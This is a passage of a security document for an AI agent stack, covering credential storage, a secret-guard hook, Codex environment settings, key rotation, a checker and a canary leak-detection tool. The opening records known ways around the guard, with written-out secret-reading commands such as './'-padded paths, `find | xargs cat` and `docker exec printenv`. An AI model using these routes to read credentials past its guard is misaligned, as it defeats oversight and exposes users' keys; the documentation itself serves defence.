  it (2026-09-28 cross-family review; every item passes on the base guard
  too, for example `cat ~/.config/./omniroute/gateway.sqlite`): a `./` or an
  interior `//` in the path, since the match is on the literal text; a path
  relative to a parent (`< runtime-workers/openhands/secrets/F cat` or
  `tar -cf - runtime-workers/openhands/secrets` from the state directory);
  and a reader fed by a pipeline (`find DIR -print0 | xargs -0 cat`, `find
  DIR -exec rtk read {} +`), although `find -exec cat` and `xargs cat` with a
  store operand are blocked;
- the OpenHands agent-server's own environment (2026-09-28): `docker exec
  <server> printenv`, or a shell in the container, and a full `docker
  inspect <server>`, whose `Config.Env` holds the key, show the session
  key, and the guard does not model docker subcommands. The variable name
  `OH_SESSION_API_KEYS_0` is not one of the guard's secret names. The
  runtime worker's host driver (#425) never exports it on the host: it
  writes the value only to the two private files and passes their paths
  (`--env-file`, `curl -H @file`), so `$OH_SESSION_API_KEYS_0` in a host
  command expands to nothing. Listing the name would also stop an explicit
  lookup inside the container (`docker exec <server> sh -c 'echo
  "$OH_SESSION_API_KEYS_0"'`, or `docker exec <server> python3 -c` code that
  calls `os.getenv` with the name), but not `printenv`, `env` or `docker
  inspect`, and it would refuse plain code searches of the name (`rg
  OH_SESSION_API_KEYS_0`), which the runtime worker's code and this page
  contain.

A search whose pattern is given through `-e` or a long option the guard does
not model (`rg --fixed-strings 'runtime-workers/openhands/secrets' docs`) is
read as a search of that path and blocked. That is the parser's existing
behaviour for every store (`rg -e .ssh/ docs` blocks too); a positional
pattern (`rg -n 'runtime-workers/openhands/secrets' docs`) passes.

Since 2026-09-27 every rule of the guard also reads the command an `rtk`
invocation runs. The guard runs beside RTK's Claude hook and sees the
command as Claude wrote it (matching hooks run in parallel and a deny
wins, [hooks](https://code.claude.com/docs/en/hooks)), so a typed `cat F`
was always caught; but agents also write rtk forms themselves, such as a
re-run as `rtk proxy <command>`, and before this change `rtk proxy cat
.env` passed every reader rule. `proxy`, `summary`, `err` and `test` run
the command after them, `run` hands its command to `sh -c`, `read`,
`smart`, `json` and `log` read their files, and any other subcommand runs
the program of the same name, so `rtk env` counts as an environment dump
(`rtk --help`, rtk 0.50.0).

### Codex

Stop credential and broker variables from reaching Codex shells with an
empty inherited environment plus explicit, non-secret `set` entries. In
`~/.codex/config.toml`:

```toml
[shell_environment_policy]
inherit = "none"

[shell_environment_policy.set]
# Only what Codex shells need. Never put a credential here.
PATH = "/usr/local/bin:/usr/bin:/bin"   # keep your existing PATH entry
HOME = "/home/example"   # your home directory
RTK_TELEMETRY_DISABLED = "1"
```

Add any other non-secret variable a tool in those shells needs (for example
`LANG`, `TERM` or `TMPDIR`). The official Codex configuration reference
(<https://developers.openai.com/codex/config-reference>, fetched 2026-09-24)
documents `inherit` as `all`, `core` or `none`, `set` as "explicit
environment values injected after exclusions", and `ignore_default_excludes`
as `true` by default, which keeps variables whose names contain `KEY`,
`SECRET` or `TOKEN`.

This choice rests on the repository's own measurement on codex-cli 0.155.1
([`blueprints/gap-wave2-20260923/us-equities__security-supply-chain/write_receipts.py`](../blueprints/gap-wave2-20260923/us-equities__security-supply-chain/write_receipts.py)
lines 181-187, canary values in the launcher environment, `codex sandbox`):
with `inherit = "none"` no broker variable reached the shell and no process
environment held the canary; the default policy passed all 12 names; and
`ignore_default_excludes = false` still passed `TWS_*`, `IBKR_ACCOUNT_ID`,
`ALPACA_PAPER*`, `ALPACA_ACCOUNT_PROFILE` and `APCA_API_BASE_URL`.
`inherit = "core"` is documented but **unmeasured** here; do not rely on it
without rerunning that canary probe (`worker_env_check.sh` and the B-arm
method). `credential_status.py --client-guards` counts only
`inherit = "none"` as guarded.

This setting controls **environment inheritance, not file reads**. A Codex
shell runs as your user and can still read a credential file, for example
`cat` on the store. The file-level mitigations are the store's location
outside every workspace, so no project checkout contains it, plus the Codex
sandbox; this setting adds nothing there. With the storage rules above, no
credential variable should be in the launcher environment in the first
place.

## Rotation and incidents

Rotate immediately when any of these happens: a gitleaks, push-protection or
secret-scanning alert; the checker reports mode, owner or location drift; a
value appears in a transcript, log, receipt, telemetry or agent context,
including a key pasted into a prompt or passed through a tool call; a host is
lost or retired; a collaborator or device changes. Rotate the Alpaca
paper pair once after adopting this layout, because broker-prefixed variable
names were seen in a launcher environment on 2026-09-23. Paid keys (Databento,
Typesafe) rotate quarterly. The checker flags files older than 90 days as
information only, not as a failure.

To rotate a file-based secret:

1. Regenerate the key at the provider, which invalidates the old one.
2. Write the new file next to the old one, then move it into place:
   `install -m 600 <template> "$d/<name>.env.new"`, edit it, then
   `mv "$d/<name>.env.new" "$d/<name>.env"`.
3. Run `scripts/credential_status.py` and a paper connectivity check.

To rotate the other kinds:

- **Grafana:** delete its env file, rerun
  `observability/backends/configure.py`, then restart the unit.
- **Native sign-ins:** `/logout` in Claude Code, `codex logout` then
  `codex login --device-auth`, or `gh auth refresh`. Revoke stale tokens and
  OAuth apps in GitHub settings. For Hugging Face, delete or refresh the
  host's token at <https://huggingface.co/settings/tokens>, then run
  `hf auth logout` and `hf auth login` in your own terminal.
- **Actions secret:** run `gh secret set FOUNDATION_RESTORE_FIXTURE_20260920`
  from your own terminal.

If a value reaches GitHub or any store that keeps output:

1. Rotate first. Rewriting history does not undo exposure on a public
   repository.
2. Purge or quarantine the copies: the transcript files, RTK recall entries,
   context-mode knowledge base, ai-memory observations and telemetry that
   hold it.
3. Clean up history if needed.
4. Report it through the private advisory flow in
   [`SECURITY.md`](../SECURITY.md), never in a public issue.

## Checker

```sh
python3 scripts/credential_status.py            # text
python3 scripts/credential_status.py --json     # machine-readable
python3 scripts/credential_status.py --client-guards   # also check the user-level guard keys
```

For each entry the checker reports existence, type, mode, owner, directory
mode, whether the file is inside a worktree or tracked by Git, and its age.
Runner-eligible private files that pass those checks are read through
`credential_run.py`'s checked file descriptor and validated by the same
`parse_line` function the runner uses. Every refused line reports only its
number and reason code; values never enter the report. `values_read` records
whether a grammar check read a file. Native sign-in and service-held stores
remain metadata-only. It also reports:

- secret variable names that are set in the current environment, names only;
- native store path overrides that are set (`HF_TOKEN_PATH`), names only; each
  affected row also gets the warning `store_path_overridden`, because it then
  inspects a path the tool no longer uses;
- tracked files with credential-shaped basenames;
- whether `core.hooksPath` points at `scripts/git-hooks`;
- whether gitleaks is on `PATH`;
- whether the project guard file exists;
- a `kernel_keyring` row as `unchecked`, with persistence `memory_only` and
  the warning `memory_only_lost_on_restart`, because the next kernel restart
  erases it. A required `kernel_keyring` row is an inventory error (exit 2),
  since a required key must survive a restart;
- names in the store directory that no row claims (`undeclared_store_file`),
  such as a stray file or the temporary file of an interrupted write. This
  is one directory listing: no file is opened, and a symlinked store
  directory is not listed through;
- live `user` keys of your uid described `native-agent-stack:<name>` in
  `/proc/keys` whose `<name>` no `kernel_keyring` row declares
  (`undeclared_keyring_key`, Linux only). `<name>` is the whole rest of the
  description, `/` and `:` included, and only a `key_name` equal to it
  declares a key. That file shows each key's description and payload length,
  never its value; revoked, invalidated or expired keys are skipped.

Both coverage lists are names only and are warnings, never a failure.
Together with the rows they account for every file directly in the store
directory and every live key of your uid under this stack's keyring prefix.

`--client-guards` parses `~/.claude/settings.json` and `~/.codex/config.toml`
and reports only booleans: user deny rules for the store, the user secret-guard
hook (registered and installed), the Claude sandbox, whether Claude Code
telemetry logs content (`claude_telemetry_logs_content`, plus one boolean per
flag; key names and truthiness only), and whether Codex uses
`inherit = "none"`. The exit status is 1 when any credential file that
exists is unsafe, whatever the entry's status, so a group-readable Hugging
Face token fails the check as a broker key does. It is 2 for an invalid
inventory. Missing files and warnings are informational.

## Restart check (2026-09-29)

A kernel restart erases the kernel keyring and must leave every key file of
the store as it was. `scripts/credential_boot_receipt.py` shows whether it
did, without a value and without a person present. The
`credential-boot-receipt.service` oneshot runs `record` at every start of the
user's service manager: with linger on, that is every boot (on WSL, every
distro start), with no login and no unlock. Each receipt is a 0600 file in
the 0700 directory
`${XDG_STATE_HOME:-$HOME/.local/state}/native-agent-stack/credential-boot/`,
named `<sequence>-<UTC stamp>-<boot id prefix>.json`; `compare` orders
receipts by the sequence number, never by the clock, which can step back on
WSL. It holds the boot id, uptime, systemd version, linger, the checkout revision,
the checker's metadata-only rows (states, findings, warnings and path templates), each file
row's `lstat` mode, size and mtime_ns, the checker's coverage names, the names
of live `native-agent-stack:*` kernel keys, and `claude_user_guard_matches_pin`
(the installed user-scope guard's sha256 against its line in
`adoption/hooks/claude/SHA256SUMS`, also reported by
`credential_status.py --client-guards`). No store file is opened and no
content hash is kept. `compare` prints states and the names of changed
fingerprint fields, never their values. Publish its output, never a raw
receipt: the size of a one-variable file gives its value's length. The paper
units keep `--env-file "$PAPER_ENV_FILE"` (and `"$PAPER_ENV_FILE_2"`); this
check does not change them.

Before the restart, once this change is merged, the coordinator runs these
host writes, announced to the peers first:

1. Fast-forward the live clone, render and install the unit, and enable it:

   ```sh
   cd ~/code/native-agent-stack-live
   git fetch origin main
   git merge --ff-only origin/main
   sed 's#@REPOSITORY@#%h/code/native-agent-stack-live#g' adoption/templates/systemd/credential-boot-receipt.service > ~/.config/systemd/user/credential-boot-receipt.service
   systemd-analyze --user verify ~/.config/systemd/user/credential-boot-receipt.service
   systemctl --user daemon-reload
   systemctl --user enable credential-boot-receipt.service
   ```

   The merge fast-forwards, `verify` prints nothing and exits 0, and `enable`
   prints one `Created symlink` line into `default.target.wants`.
2. Smoke-run the unit, which writes the baseline receipt R0, and read it back:

   ```sh
   systemctl --user start credential-boot-receipt.service
   journalctl --user -u credential-boot-receipt.service -n 20 -o cat --grep='^credential boot receipt:'
   python3 -I scripts/credential_boot_receipt.py compare
   ```

   `start` exits 0. `-u` also shows systemd's own messages about the unit,
   such as `Finished credential-boot-receipt.service - ...`, so `--grep`
   selects the tool's lines; with `-n` it implies `--reverse`, so the first
   line is the newest and reads `credential boot receipt: rows=<n> ok=<n> ...
   guard_matches_pin=true result=ok receipt=<name>.json`. `compare` prints
   `baseline: <name> (one receipt; nothing to compare yet)` and exits 0.
3. Finish and disarm any canary proof before restart; no canary survives a
restart. Runtime proof records are bound to one boot and cannot qualify another.
4. Checkpoint the peers (the grand-dashboard checkpoint). The restart is the
   user's: once the trading lane has confirmed a time, the user runs
   `wsl --shutdown` from Windows. No agent restarts its own host.

After the restart:

5. The oneshot has written R1 at the distro start. In the first session, from
   the live clone:

   ```sh
   python3 -I scripts/credential_boot_receipt.py compare
   ```

   Expected, exit 0: `boot_id: changed`; every file row
   `ok -> ok, fingerprint same`, the `tavily` row included (from its file);
   `kernel keyring names: <names> -> none (memory only: a kernel restart erases
   them)`; `claude_user_guard_matches_pin: true -> true`; `result: ok`. Exit 1
   ends with `result: regression: <ids>`, naming each required or optional file
   row that was `ok` and is not; exit 2 means no receipt could be read or one
   is malformed, and its one line names the receipt file.
6. Publish sanitized, value-free output with host paths stripped, in a
   follow-up evidence PR: `compare`'s lines, not the receipts.

## Canary proof

`tools/credentials/canary_proof.py` is a Linux-only, synthetic proof tool for
six consumers: systemd-user-unit, fresh-claude-session, subagent,
workflow-child, codex-exec and omniroute-lane. It launches no consumers.
Its test-only inventory row is environment-only (`CANARY_E2E_KEY`, class
`test_canary`, status `test_only`); the synthetic file exists only between
arm and disarm. Patterns and controls stay in private runtime storage until
cleanup. HMAC tag lines intentionally reach the consumer's recording sink.
No canary is kept across restart; the boot-receipt comparison above qualifies
restart persistence separately.

The coordinator holds synthetic values and fixed records. A contained worker
and its dumper are scanner-equivalent children: like ripgrep, they hold sink
bytes. They alone walk names, sniff headers, read link targets, decode streams,
read configuration to check the guard pin, and parse Git/SQLite/journal data.
The coordinator never receives those bytes or raw diagnostics. Its output,
log, run record and receipts contain fixed enums, keyed opaque ids and counts.
This process boundary is the real-value guarantee; the scanner-side children's
memory is a stated residual, not an assertion that no process sees values.
"Upstream executable" means a child the worker starts (rg, gzip, bzip2, xz,
journalctl, git, systemctl, systemd-cat and the SQLite dumper); each starts
through `setpriv --pdeathsig TERM` with stdin from `/dev/null`, a held sink
descriptor or an owned pipe, and never inherits the plan, protocol or
acknowledgement descriptor.

Three fixed frames cross the boundary, all big-endian (network order), all
defined once in `canary_scan_worker.py` and imported by the coordinator:

| Frame | Bytes | Layout (offset:width field) |
| --- | --- | --- |
| PLAN, coordinator to worker, once | 64 + body | 0:4 `CPPL`; 4:1 version 1; 5:1 kind 1; 6:2 zero; 8:16 request nonce; 24:4 body length (at most 4 MiB); 28:32 SHA-256 of the body; 60:4 zero; then the body, canonical JSON (sorted keys, ASCII, no spaces) |
| CP03, worker to coordinator | 128 | 0:4 `CP03`; 4:1 version 1; 5:1 kind; 6:2 zero; 8:16 nonce; 24:8 sequence; 32:8 check id; 40:2 sink; 42:1 mode; 43:1 view; 44:1 class; 45:1 path class; 46:1 status; 47:1 reason; 48:1 consumer; 49:7 zero; 56:4 attempt; 60:4 subpass; 64:8 observed; 72:8 expected; 80:4 signed exit; 84:4 zero; 88:16 opaque object id; 104:16 seal; 120:8 auxiliary count |
| ACK, coordinator to worker, per HIT | 32 | 0:4 `CPAK`; 4:1 version 1; 5:1 kind 1; 6:2 zero; 8:16 nonce; 24:8 the HIT's sequence number, sent only after the `hit` event is fsynced |

CP03 is contract draft 3's record with amendment C7's extensions: kind 9
COUNTER (check id 1-12: selected, unselected, special, excluded_key,
excluded_user, declined, declared_link, dangling_link, covered_link,
excluded_link, directories, git_stores; observed is the count), class 8
anchor, path classes 14-16 for the coordinator's own session (main, subagent,
workflow) beside 1-3 for other sessions, FACT 10 guard pin, 11 store
outside a worktree, and 12 scope binding (observed worker PID, expected numeric
scope suffix, all other optional fields zero). The coordinator binds the scope
to its runner PID using kernel membership metadata. After END the worker waits
for shutdown on its existing acknowledgement channel; the coordinator invokes
the runner's native stop trap and requires the scope to be empty before reaping.
M2 metadata checks carry the format enum and bind the per-format controls.
Every field a kind does not use must be zero; a partial
frame, a gap in the sequence, another nonce or an unknown value makes the
request incomplete. Version FACTs use one formula for every executable the
worker calls (rg, git, gzip, bzip2, xz, journalctl, systemctl, systemd-cat,
setpriv, nice, ionice, python3) and for SQLite: major x 1,000,000 + minor x
1,000 + patch, so rg 14.1.0 is 14001000.

Reuse sources are [ripgrep 14.1.0](https://github.com/BurntSushi/ripgrep/tree/e50df40a1967708b9781486b1c017e48040bceb0),
`crates/core/flags/defs.rs`, `hiargs.rs`, `main.rs` and the standard printer;
GNU gzip/bzip2/xz's installed `-d -c` interfaces; Git v2.43.0 cat-file/fsck/
verify-pack; SQLite URI/WAL/schema interfaces; and the unchanged repository
`ecosystem-bounded-run`, credential runner, writer and boot-receipt publisher.
ripgrep 15.2.0 (`e89fff89`) is a source-reviewed output grammar, not executed:
the runtime accepts that version with its separate stats terminator, but its
only test is a hand-written stats fixture. The executed version is 14.1.0.
Resolve, hash and invoke absolute executables; a new version requires review
and the corresponding fixtures. No ripgrep compression switch, quiet
mode, recursive sink-path argv or raw fallback is used.

The runtime root must be an absolute, owned 0700 `XDG_RUNTIME_DIR`; records
and patterns are 0600. One nonblocking per-user flock spans each invocation,
including cleanup. `--session` optionally binds the coordinator session id;
without it, attribution reports reduced assurance. Register every planned
Codex home before baseline. A later arm cannot add an unbaselined home.

```sh
rtk python3 tools/credentials/canary_proof.py prepare --transcripts confirmed --codex-home LANE_HOME --session SESSION_ID
rtk python3 tools/credentials/canary_proof.py scan --run RUN --phase baseline
rtk python3 tools/credentials/canary_proof.py arm --run RUN CONSUMER
rtk python3 tools/credentials/canary_proof.py arm --run RUN omniroute-lane --codex-home LANE_HOME
rtk python3 tools/credentials/canary_proof.py disarm --run RUN
rtk python3 tools/credentials/canary_proof.py scan --run RUN --phase final
rtk python3 tools/credentials/canary_proof.py status --run RUN
rtk python3 tools/credentials/canary_proof.py verdict --run RUN
rtk python3 tools/credentials/canary_proof.py cleanup --run RUN
```

Arm prints an id-only probe command followed by the disarm command; use that
exact probe command in each approved consumer. Systemd adds `--leak-check`
and records the masked form corpus in the user journal. Other consumer output
goes to `/dev/null`; the client records the tag in its usual sink. S8 is the
packaged `canary_lane_consumer.sh`, which selects the registered home, profile
stack-worker, model cx/gpt-6-astra, effort max and a 900-second bound; it takes
stdin and sends stdout/stderr to `/dev/null`, with no capture file. The
placeholder assignment stays inside the wrapper. The workflow has two
source-scout stages, each sonnet/max, under the native Workflow interface.

Only the user in their terminal may run these optional commands:

```sh
rtk python3 tools/credentials/canary_proof.py scan --run RUN --phase final --user-run
rtk python3 tools/credentials/canary_proof.py scan --run RUN --phase comparison --user-run
```

The TTY/unset-CLAUDECODE checks are accident guards. K4 must deny agent Bash
`--user-run`, `--phase comparison` and `--phase=comparison`. Argparse accepts
no abbreviations. The build skips denial acceptance only when K4 item 14 is
absent; installing K4 is mandatory before the operational window.

Every scan request is appended and fsynced before its directory, union,
controls or workers are prepared. The latest request supersedes earlier
passes even if setup fails or SIGKILL occurs before the plan. Every valid
hit is fsynced before acknowledgement and remains sticky across retries,
rotation, user scans, comparison and cleanup. An optional request becomes
required once made. A successful fragment never fills a missing obligation.
Final/user/comparison freshness requires matching attempts, patterns, pins,
boot, complete ledgers and at least 1,200 boottime seconds since last disarm.
The one stability retry consumes the original sink deadline.

| Exit | Meaning |
| --- | --- |
| 0 | Successful operation, complete zero-hit baseline/scan, or clean classifier result |
| 1 | Safety/precondition refusal, including unsupported platform |
| 2 | CLI usage |
| 3 | Incomplete classifier or scan |
| 4 | Invalid record |
| 5 | Sticky canary leak; invalid-record precedence remains exit 4 |
| 75 | Lock busy; no request admitted |

`status`, `verdict` and `cleanup` return the classifier's 0/3/4/5, or 1 on a
precondition refusal and 75 on contention. `record_invalid` maps to 4.
Every other code below maps to 3; a validated sticky hit takes precedence
over incompleteness and yields 5.

| Code family (closed suffixes: CONSUMER, SINK, opaque ROOT id, CHECK number, the fixed `agentsview`, or a fixed REASON) | Exit |
| --- | --- |
| boot_changed, tool_changed, pattern_file_mismatch, clock_stepped, guard_not_pinned | 3 |
| no_baseline, baseline_unfinished, baseline_incomplete, baseline_after_arm, baseline_scope_missing | 3 |
| baseline_sink_not_scanned:SINK, baseline_check_not_scanned:ROOT:CHECK, baseline_sink_incomplete:SINK, baseline_control_missing | 3 |
| not_armed:CONSUMER, not_disarmed:CONSUMER, disarm_unverified:CONSUMER, guard_not_pinned_at_arm:CONSUMER, recording_missing:CONSUMER | 3 |
| no_final, final_unfinished, final_incomplete, final_stale, final_too_early | 3 |
| sink_not_scanned:SINK, check_not_scanned:ROOT:CHECK, sink_incomplete:SINK:REASON, inventory_unreconciled | 3 |
| control_missing:SINK, masking_markers_mismatch | 3 |
| user_run_unfinished, user_run_incomplete, user_run_stale, user_run_too_early | 3 |
| user_run_sink_not_scanned:SINK, user_run_check_not_scanned:ROOT:CHECK, user_run_sink_incomplete:SINK, user_run_control_missing, user_arrival_missing:agentsview | 3 |
| comparison_unfinished, comparison_incomplete, comparison_stale, comparison_too_early | 3 |
| comparison_sink_not_scanned:SINK, comparison_check_not_scanned:ROOT:CHECK, comparison_sink_incomplete:SINK, comparison_control_missing | 3 |
| store_armed, arming_unresolved, store_absence_unverified | 3 |

`protocol_error` and `negative_control_matched` are fixed REASON suffixes of
`sink_incomplete:SINK:REASON`, rather than standalone verdict codes.
`arm` prints an absolute `/usr/bin/python3 -I <checkout>/tools/credentials/...`
probe command, which also resolves inside a user service's default directory.

An agent scan covers A1 Claude state; A2 audit/bash history; A3 MCP cache;
A4 all registered Codex homes; A9 collector file export; A10 task directories;
A11 inclusive-cursor user-journal export; and A12 configured Git stores plus
stores discovered inside an already covered root. A5–A8 are retired.

User scans add U1 OmniRoute account state; U2 Docker environments/auth config;
U3 Codex shell snapshots; U4 full user-manager environment; U5 environment/unit
configuration; U6 Claude history/paste cache and each Codex history.jsonl;
U7 client configuration and backups; U8 agentsview/ai-memory/context-mode/RTK/
headroom aggregates and top-level Codex SQLite families. Codex rust-v0.157.1
[`message-history/src/lib.rs`](https://github.com/openai/codex/blob/36650394c5b38c2990ccf2a3457165ca3e9d9726/codex-rs/message-history/src/lib.rs#L52)
places history.jsonl in CODEX_HOME; this mapping does not inspect a real history.
Requested U finals require the fresh-session tag's agentsview arrival.

K is never scanned: the key store, exact inventory credential/native-store
paths, registered auth files, declared pointer targets, SSH/GnuPG, the Claude
daemon key and keys directly in its sessions directory. Exclusions match
canonical locations, not an arbitrary basename. Metadata at a parent's
boundary is counted; key-home contents are never opened. The narrow synthetic
store lifecycle exception permits only create-only publication, no-follow stat
of the fixed leaf, and identity-checked unlink. A missing/unsafe store is
neither created nor chmodded. A foreign file is preserved.

`--transcripts exclude` is the default and excludes exactly every Claude
projects subtree and every registered Codex sessions subtree, all or nothing.
It cannot be broadened within a run. Required tags in declined roots remain
missing, so such a run cannot establish the six-consumer proof. At window time
the user may confirm those roots are safe and inactive through the last scan;
no transcript purge is requested or performed.

Selection uses full-file ctime at the prepare reference minus one hour,
selecting all on unknown filesystems and in comparison. Held regular fds,
pre/post full identity tuples, complete directory entry lists, family membership
and route rechecks establish metadata quiescence. This is not an atomic snapshot.
Every claim retains backward clock excursions beyond the hour margin that are
undone between checks, deferred shared-mapping timestamps, privileged/direct-
disk or same-uid tampering, and writes after the final check as residuals.

M1 raw always runs; BOM, compression, Git and SQLite logical views are additive.
Every compressed UTF-16 stream fans one decoder into raw and BOM-first readers.
Git reconciles physical loose/packs against verified enumeration and scans
metadata such as .keep. The .keep control exists only in the synthetic control
repository. A gitfile whose target is uncovered or not a logical store, and a
directory reached directly with Git object-store shape (a loose object
`objects/<2 hex>/<rest of an object name>`, or a pack or index file in
`objects/pack`) but no HEAD, refs or `*.git` name, refuse as incomplete with
`git_indirection_unplanned`. SQLite covers schema SQL/names and
ordinary/shadow-table values, checks escaped read-only URIs and the actual main
fd, and never creates missing WAL/SHM to rescue a read. Virtual tables require
real shadow tables. Special entries are name-checked but never opened for
content. Each request/control kind gets a fresh control value. Unrelated
sentinels exist only in test fixtures.

Recognized unsupported zstd/lz4/compress/lzip/lzop/Snappy/brotli and containers
make selected content incomplete. Container signatures at offset zero include
zip local/empty/spanned, 7z, RAR, PDF, cpio newc/crc/odc, ar, cabinet, xar and
PACK outside a reconciled Git store; tar's ustar signature is at offset 257.
Zlib without recognized magic (outside a Git store and outside object-store
shape), nameless lzma, UTF-16 without BOM, application-compressed cells,
arbitrary transformations and paths split across Git objects are explicit
residuals. Freed SQLite pages/superseded WAL frames have raw coverage only.
Indexes, API-fed stores, unrelated scratch/state, privileged journals,
process/unit memory, terminal scrollback, remote/provider and Windows copies
remain outside scope. Receipts always say `not_covered:proxy_unverified` for Loki;
collector/Loki equality belongs only to the external window record.

The operational window requires P1 explicit Gate A closure, P2 K4 installed,
P3 accepted build plus independent Astra/Opus review, P4 pinned tools/core/scopes,
P5 no-arm rehearsal, P6 quota and a 25-point lane reserve, P7 normal client
sandbox/scrub settings, P8 packaged S8 and P9 transcript confirmation or decline.
Other Claude/Codex sessions must be idle; baseline and final come from a user
terminal, and scan output appears only after every sink finishes. P5 exercises
real session writes/Git rotations, journal cursor/anchor and collector/Loki
marker counts after W. The build suite writes nothing to the real journal.

| Window step | Action |
| --- | --- |
| W1 | Prepare with all homes, session and transcript policy registered |
| W2 | Require complete zero-hit baseline |
| W3 | Arm systemd consumer, run emitted probe with leak-check to journal, disarm |
| W4 | Arm fresh Claude, run emitted command in sonnet/max session, discard output, disarm |
| W5 | Arm subagent, one sonnet/max child runs command, discard client output, disarm |
| W6 | Arm workflow, run two-stage native workflow with run/attempt, disarm |
| W7 | Arm ordinary Codex, read-only exec with null stdin/output, disarm |
| W8 | Arm registered lane, packaged null-output wrapper, disarm |
| W9 | Wait 1,200 boottime seconds, request agent final from user terminal |
| W10 | Optional U final/comparison in the user's terminal; requests become required |
| W11 | Verdict publishes current high-water receipt and scoped claim |
| W12 | Cleanup safely disarms if pending/armed, checks absence, publishes same classifier result |

On failure disarm, preserve sticky hits and resolve the cause before a new
request. A zstd installation requires an announced host change after W, an
updated decoder contract and fixtures. Cleanup records its absence check as
`cleaned`, which does not stale final evidence, then removes owned runtime files.
Receipt publication is create-only and rejects synthetic forms/tags/controls.
An old receipt is historical at its high-water mark; it never authorizes a
new invocation. No operational acceptance is claimed by synthetic tests.

The build's synthetic acceptance runs from the checkout, never against the
operator's homes: `tests/test_canary_proof.py` (every class builds its own
host under `/tmp`; `python3 -I tests/test_canary_proof.py --skip-list` prints
the machine-readable skip list, and on the workstation the boundary, request,
stability, mode, FIFO, store and real-scope containment classes skip nothing)
and the mutation table:

```sh
rtk python3 -I tests/canary_mutants.py --json
```

It prints one JSON object per mutant (`id`, `target_file`, `patch_sha256`,
`killing_test`, `failing_assertion`, `killed`) and exits 0 only when every
mutant is killed: its named test passes unmutated and fails with that exact
assertion on the mutant, in a scratch copy under `/tmp`.

## Follow-ups not in this change

- A shared loader (`load_private_env`) whose `--env-file` defaults to the
  conventional path. `runner.credentials` and `market_research.credentials`
  would delegate to it. Delegating changes behaviour: `runner.credentials`
  resolves symlinks today, and `O_NOFOLLOW` would refuse them. That change
  must be tested and documented when it lands.
- Move the environment-only consumers above to it (item A1), together with
  the lane that owns them, and replace `${ENV_FILE:?}` in
  `adaptive-paper/scheduled_trial.sh` with a default.
- A gitleaks rule keyed on the Alpaca variable names, plus a rule on the
  key's shape once that format is checked against Alpaca's own documentation.
- A measured Claude Code sandbox profile (`sandbox.enabled`,
  `allowUnsandboxedCommands: false`, `credentials.files` deny for the store,
  and the network allowlist the runners need). The measurement must include a
  check that sandboxed commands cannot reach the user systemd bus
  (`systemd-run --user`).

## Declared test contracts for credential-status grammar (2026-10-08, PR #849)

The CC's credential-status ruling of about 08:00Z requires the status tool to
report every line the native runner refuses, without returning a credential
value. The shared runner grammar and checked reader therefore replace the old
metadata-only inspection contract. The following main-version methods have
changed expectations; no production credential store was used to check them:

- `tests.test_credential_status.CredentialStatusTests.test_undeclared_store_file_is_reported_by_name_only`:
  an undeclared file is still reported by name only. The old assertion also
  prohibited every read under the store directory; the new fixture allows the
  checked reader to validate the declared export-form file in that directory.
- `tests.test_credential_status.CredentialStatusTests.test_private_file_is_ok_and_output_is_value_free`:
  a safe runner-eligible private env file is `ok` only when its contents satisfy
  the runner's export grammar. The positive fixture now uses export form; raw
  private files retain metadata-only inspection and output remains value-free.
- `tests.test_credential_status.CredentialStatusTests.test_never_opens_or_reads_credential_files`:
  the old metadata-only/no-content-read test is replaced by
  `tests.test_credential_status.CredentialStatusTests.test_private_env_file_uses_checked_reader_without_path_reads`.
  Credential content may reach the native checked reader for grammar validation;
  the replacement verifies that boundary and retains value-free output.
- `tests.test_credential_status.CredentialStatusTests.test_guard_pin_check_hashes_only_the_installed_guard`:
  the guard pin still hashes only the installed guard. The old assertion also
  prohibited store reads; the new contract permits the checked grammar read of
  the declared export-form fixture, while never publishing its value or digest.

Main's test file at `64a8cda01700d5e823c18e4b989e856de2ee2241`, run against the
PR source at `0ca21c31b36e0a9aa99de949fe77dd5b7dff83c3`, returned exactly these
four failures in 44 tests. The PR's own affected modules pass separately. These
are repository integration checks, not upstream runtime or host-store acceptance.

The same lazy shared-reader import exposes nine pre-existing read sites to the
OpenHands advisory import-closure report: five in the runner and four in the
setter. The branch-specific monitoring baseline now records 330 unclassified
reads and 97 shape locations, with no lost sites, no enforced unresolved reads,
and the existing breadth limits unchanged. The monitoring classification,
resolver, workflow and assertions remain unchanged. This snapshot belongs to
the PR's source; current main's 321-read baseline is retained on main.
The review repair uses the runner's exact `injectable()` predicate and calls its
`disable_core_dumps()` guard before the checked reader. Raw private files retain
metadata-only inspection. Text output discloses possible checked grammar reads
and retains the value-free contract. Synthetic regressions verify that a raw
private file is not parsed and that a native core-collector refusal prevents any
store read; they never inspect an operator's store or print fixture values.

Main's current test file at `618dd6c05ff6750705b52426261748d11e003477`, blob
`6c666faa014422064f8927c8ee145be0e3256e1a`, run against the review-fixed source
in a disjoint checkout, still returned exactly the four declared methods above
in 44 tests. The affected credential modules passed 141 tests separately. These
results supplement the earlier measurements without relabeling them as host or
upstream acceptance.
